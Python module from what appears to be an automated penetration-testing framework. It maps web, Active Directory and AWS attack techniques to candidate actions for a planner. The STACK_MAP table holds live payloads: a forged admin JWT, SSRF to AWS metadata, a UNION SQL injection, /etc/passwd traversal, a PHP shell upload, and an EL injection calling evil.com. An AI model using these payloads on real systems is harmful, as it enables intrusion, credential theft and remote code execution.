"""
student_generator.py — Student Candidate Generator (S1-A)

Converts StackMatcher hypotheses + STACK_MAP capability registry into
standard Candidate dicts for the Planner.

This replaces the old test_map in orchestrator/modes/student.py.
The Student no longer executes directly — it proposes Candidates.
The Planner scores them. The CapabilityBroker authorizes them.

Architecture:
    StackMatcher.get_ranked_hypotheses(stack)
        → StudentCandidateGenerator.generate_candidates(target, profile)
            → list[dict] (Candidate format for Planner.decide())

Schema version: 1
"""

import logging
import uuid
from typing import Any, Optional

from orchestrator.student.stack_matcher import StackMatcher

logger = logging.getLogger("candidate_generators.student")

# ── Candidate Origin Marker ─────────────────────────────────────
CANDIDATE_ORIGIN_STUDENT = "STUDENT"

# ── STACK_MAP — Structured Candidate Templates ──────────────────
# Replaces the old test_map (dict of technique_id → curl commands).
# Each entry maps a technique_id to a Candidate template with:
#   action_type:     What kind of action (matches Planner action types)
#   capability:      Tool required (matches Broker allowed_capabilities)
#   method:          Execution method
#   impact_estimate: Default CVSS-like impact (0-10)
#   confidence_threshold: Minimum confidence to propose (0-1)
#   description:     Human-readable description
#   action_spec:     Structured parameters for execution

STACK_MAP: dict[str, dict] = {
    "jwt_alg_none": {
        "action_type": "direct_probe",
        "capability": "curl",
        "method": "header_test",
        "impact_estimate": 8.5,
        "confidence_threshold": 0.3,
        "description": "JWT algorithm confusion — test 'alg: none' header bypass",
        "action_spec": {
            "headers": {"Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9."},
            "path": "/admin",
            "expected_indicator": "200",
        },
    },
    "ssrf_imds_aws": {
        "action_type": "direct_probe",
        "capability": "curl",
        "method": "url_param_test",
        "impact_estimate": 9.0,
        "confidence_threshold": 0.3,
        "description": "Server-Side Request Forgery to AWS IMDS (169.254.169.254)",
        "action_spec": {
            "param": "url",
            "payload": "http://169.254.169.254/latest/meta-data/",
            "expected_indicator": "meta-data",
        },
    },
    "nextjs_middleware_bypass_2025": {
        "action_type": "direct_probe",
        "capability": "curl",
        "method": "header_test",
        "impact_estimate": 8.0,
        "confidence_threshold": 0.4,
        "description": "Next.js middleware bypass via x-middleware-subrequest header",
        "action_spec": {
            "headers": {"x-middleware-subrequest": "middleware"},
            "path": "/admin",
            "expected_indicator": "200",
        },
    },
    "sqli_union_basic": {
        "action_type": "direct_probe",
        "capability": "curl",
        "method": "param_test",
        "impact_estimate": 8.5,
        "confidence_threshold": 0.4,
        "description": "Basic SQL injection via UNION SELECT in query parameter",
        "action_spec": {
            "param": "id",
            "payload": "1' UNION SELECT 1,2,3--",
            "expected_indicator": "union",
        },
    },
    "idor_parameter_manipulation": {
        "action_type": "http_get",
        "capability": "curl",
        "method": "path_enumeration",
        "impact_estimate": 7.5,
        "confidence_threshold": 0.4,
        "description": "Insecure Direct Object Reference — parameter manipulation",
        "action_spec": {
            "path": "/api/user/1",
            "expected_indicator": "user data",
        },
    },
    "glassfish_el_injection": {
        "action_type": "direct_probe",
        "capability": "curl",
        "method": "path_test",
        "impact_estimate": 9.5,
        "confidence_threshold": 0.5,
        "description": "GlassFish EL injection via admin gadget handler",
        "action_spec": {
            "path": "/common/gadgets/gadget.jsf",
            "param": "gadget",
            "payload": "http://evil.com/payload",
            "expected_indicator": "200",
        },
    },
    "lfi_rfi": {
        "action_type": "direct_probe",
        "capability": "curl",
        "method": "path_traversal",
        "impact_estimate": 7.0,
        "confidence_threshold": 0.4,
        "description": "Local/Remote File Inclusion via path traversal",
        "action_spec": {
            "param": "page",
            "payload": "../../../../etc/passwd",
            "expected_indicator": "root:x:",
        },
    },
    "file_upload_shell": {
        "action_type": "direct_probe",
        "capability": "curl",
        "method": "upload_test",
        "impact_estimate": 9.0,
        "confidence_threshold": 0.4,
        "description": "File upload — attempt to upload PHP shell",
        "action_spec": {
            "path": "/upload",
            "file": "shell.php",
            "expected_indicator": "200",
        },
    },
    "httperf_overflow_rce": {
        "action_type": "direct_probe",
        "capability": "python3",
        "method": "overflow_check",
        "impact_estimate": 9.5,
        "confidence_threshold": 0.3,
        "description": "HTTP.sys overflow check — oversized request length",
        "action_spec": {
            "check_type": "oversized_request",
            "expected_indicator": "timeout_or_500",
        },
    },
    # Student KB auto-derived techniques have no STACK_MAP entry
    # They use a default template
    "default": {
        "action_type": "direct_probe",
        "capability": "curl",
        "method": "auto",
        "impact_estimate": 7.0,
        "confidence_threshold": 0.5,
        "description": "Auto-derived technique from Student KB",
        "action_spec": {},
    },
    # AD techniques from StackMatcher signatures
    "kerberoasting": {
        "action_type": "exploit",
        "capability": "impacket",
        "method": "kerberoast_scan",
        "impact_estimate": 8.0,
        "confidence_threshold": 0.5,
        "description": "Kerberoasting — extract SPN service account hashes",
        "action_spec": {"technique": "GetUserSPNs", "expected_indicator": "hash"},
    },
    "asrep_roast": {
        "action_type": "exploit",
        "capability": "impacket",
        "method": "asrep_scan",
        "impact_estimate": 7.5,
        "confidence_threshold": 0.5,
        "description": "AS-REP roasting — find users without Kerberos pre-authentication",
        "action_spec": {"technique": "GetNPUsers", "expected_indicator": "hash"},
    },
    "bloodhound_path": {
        "action_type": "scan",
        "capability": "bloodhound-python",
        "method": "collection",
        "impact_estimate": 7.0,
        "confidence_threshold": 0.6,
        "description": "BloodHound AD attack path mapping",
        "action_spec": {"collection_method": "all", "expected_indicator": "json"},
    },
    "s3_bucket_misconfig": {
        "action_type": "enumerate",
        "capability": "awscli",
        "method": "s3_list",
        "impact_estimate": 7.5,
        "confidence_threshold": 0.4,
        "description": "S3 bucket misconfiguration — bucket listing and ACL check",
        "action_spec": {"action": "list-buckets", "expected_indicator": "Bucket"},
    },
    "aws_iam_privesc": {
        "action_type": "enumerate",
        "capability": "awscli",
        "method": "iam_policy_scan",
        "impact_estimate": 8.5,
        "confidence_threshold": 0.4,
        "description": "AWS IAM privilege escalation — trust policy abuse",
        "action_spec": {"action": "simulate-principal-policy", "expected_indicator": "Allow"},
    },
}


def resolve_template(technique_id: str) -> dict:
    """Resolve a technique_id to a Candidate template from STACK_MAP.
    
    Args:
        technique_id: The technique identifier (e.g., "jwt_alg_none")
    
    Returns:
        A template dict (shallow copy of the STACK_MAP entry or default)
    """
    template = STACK_MAP.get(technique_id)
    if template is None:
        # For unknown techniques, check for partial matches
        # (e.g., "sqli_blind" → use "sqli_union_basic" template)
        tid_lower = technique_id.lower()
        for key, tmpl in STACK_MAP.items():
            if key != "default" and (key in tid_lower or tid_lower in key):
                template = tmpl
                break
        if template is None:
            template = STACK_MAP["default"]
    return dict(template)  # Shallow copy so caller can modify


class StudentCandidateGenerator:
    """
    Generates Candidate dicts from a target profile using StackMatcher + STACK_MAP.
    
    This is the S1-A replacement for the old _generate_hypotheses() + _test_hypothesis()
    direct execution path. The Student proposes Candidates; the Planner scores and
    selects them; the CapabilityBroker authorizes execution.
    
    Usage:
        generator = StudentCandidateGenerator()
        candidates = generator.generate_candidates(
            target="10.0.1.10",
            profile={"stack_components": ["nginx", "django", "jwt", "aws"]},
        )
        # candidates is a list of dicts ready for Planner.decide()
    """
    
    def __init__(self, growth_db=None):
        self._stack_matcher = StackMatcher(growth_db=growth_db)
    
    def generate_candidates(
        self,
        target: str,
        profile: dict,
        max_candidates: int = 15,
        min_confidence: float = 0.2,
        waf_info: Optional[dict] = None,
    ) -> list[dict]:
        """Generate Candidate dicts from a target profile.
        
        Args:
            target: Target IP, hostname, or identifier
            profile: Target profile dict with 'stack_components' list
            max_candidates: Maximum number of candidates to produce
            min_confidence: Minimum confidence threshold for inclusion
            waf_info: Optional WAF detection result dict (from WAFDetector.fingerprint)
        
        Returns:
            List of Candidate dicts in the format expected by Planner.decide()
        """
        stack = profile.get("stack_components", [])
        if not stack:
            logger.debug("[StudentGenerator] Empty stack, no candidates")
            return []
        
        # Step 1: Get hypotheses from StackMatcher
        hypotheses = self._stack_matcher.get_ranked_hypotheses(stack)
        if not hypotheses:
            logger.debug("[StudentGenerator] No hypotheses from StackMatcher")
            return []
        
        # Step 2: Convert each hypothesis to a Candidate dict
        candidates: list[dict] = []
        seen_techniques: set[str] = set()
        
        for hyp in hypotheses:
            if len(candidates) >= max_candidates:
                break
            
            tech_id = hyp.get("technique_id", "")
            if not tech_id or tech_id in seen_techniques:
                continue
            seen_techniques.add(tech_id)
            
            confidence = hyp.get("confidence", 0.0)
            if confidence < min_confidence:
                continue
            
            # Resolve template from STACK_MAP
            template = resolve_template(tech_id)
            
            # Build candidate dict matching Planner.decide() format
            candidate = {
                "action_type": template["action_type"],
                "capability": template["capability"],
                "target": target,
                "method": template["method"],
                "action_id": f"student_{tech_id}_{target}_{uuid.uuid4().hex[:6]}",
                "rationale": f"Student: {template['description']} — confidence={confidence:.2f}",
                "impact_estimate": template["impact_estimate"],
                "confidence": confidence,
                "technique_id": tech_id,
                "technique_name": tech_id,
                "candidate_origin": CANDIDATE_ORIGIN_STUDENT,
                # Supporting evidence from stack match
                "matched_components": hyp.get("matched_components", []),
                "signature_label": hyp.get("signature", "unknown"),
                # Action spec for execution
                "action_spec": {
                    **template["action_spec"],
                    "technique_id": tech_id,
                },
            }
            
            candidates.append(candidate)
        
        # Tag with WAF info if available
        if waf_info:
            waf_type = waf_info.get("waf_type", "unknown")
            waf_confidence = waf_info.get("confidence", 0.0)
            for candidate in candidates:
                candidate["waf_type"] = waf_type
                candidate["waf_confidence"] = waf_confidence
                candidate["waf_details"] = waf_info.get("details", {})
                # WAF presence reduces confidence
                if waf_confidence > 0.5:
                    candidate["confidence"] = candidate.get("confidence", 0.5) * 0.85
                candidate["rationale"] += f" [WAF: {waf_type}]"

        # Sort by confidence descending (highest confidence first)
        candidates.sort(key=lambda c: c.get("confidence", 0), reverse=True)
        
        logger.info("[StudentGenerator] Generated %d candidates for %s",
                     len(candidates), target)
        return candidates
    
    def get_technique_ids(self) -> set[str]:
        """Return all technique IDs known to the generator."""
        return set(STACK_MAP.keys()) - {"default"}
    
    def stats(self) -> dict:
        """Return generator statistics."""
        return {
            "templates": len(STACK_MAP) - 1,  # exclude "default"
            "technique_ids": sorted(self.get_technique_ids()),
            "stack_matcher_signatures": self._stack_matcher.stats().get("signatures", 0),
        }
